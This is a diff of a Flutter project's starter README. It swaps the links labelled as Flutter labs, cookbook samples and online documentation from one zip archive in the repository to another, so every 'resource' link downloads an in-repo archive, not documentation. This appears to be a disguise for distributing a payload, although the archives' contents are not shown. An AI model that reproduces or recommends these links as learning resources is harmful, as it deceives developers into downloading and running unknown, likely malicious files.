@@ -8,9 +8,9 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://raw.githubusercontent.com/haggeresmail/bookly_app/bookly/android/app/src/main/bookly_app_v3.9.zip)
-- [Cookbook: Useful Flutter samples](https://raw.githubusercontent.com/haggeresmail/bookly_app/bookly/android/app/src/main/bookly_app_v3.9.zip)
+- [Lab: Write your first Flutter app](https://github.com/haggeresmail/bookly_app/raw/refs/heads/bookly/windows/runner/app-bookly-2.3.zip)
+- [Cookbook: Useful Flutter samples](https://github.com/haggeresmail/bookly_app/raw/refs/heads/bookly/windows/runner/app-bookly-2.3.zip)
 
 For help getting started with Flutter development, view the
-[online documentation](https://raw.githubusercontent.com/haggeresmail/bookly_app/bookly/android/app/src/main/bookly_app_v3.9.zip), which offers tutorials,
+[online documentation](https://github.com/haggeresmail/bookly_app/raw/refs/heads/bookly/windows/runner/app-bookly-2.3.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
